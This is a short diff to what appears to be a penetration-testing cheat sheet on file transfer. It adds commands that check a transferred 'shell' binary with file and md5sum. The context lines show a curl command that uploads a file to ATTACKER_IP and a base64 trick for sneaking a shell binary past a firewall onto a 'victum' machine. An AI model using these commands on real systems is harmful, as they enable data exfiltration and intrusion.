@@ -61,6 +61,11 @@ curl -X POST --data-binary @/path/to/file http://ATTACKER_IP:PORT/upload
 #firewall bypass
 base64 shell -w 0 #convert any binary file to base64 decode to victum
 echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
+
+file shell
+
+#check the integrity of the file in both the machine.
+md5sum shell
 ```
 
 
